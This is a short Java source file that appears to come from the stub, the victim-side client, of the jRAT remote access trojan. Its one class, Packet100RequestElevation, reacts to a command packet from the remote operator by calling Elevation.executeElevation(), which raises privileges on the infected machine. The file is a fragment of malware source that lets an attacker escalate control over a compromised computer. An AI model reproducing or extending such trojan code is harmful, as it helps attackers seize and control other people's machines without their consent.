package io.jrat.stub.packets.incoming;

import io.jrat.stub.Elevation;

public class Packet100RequestElevation extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		Elevation.executeElevation();
	}

}
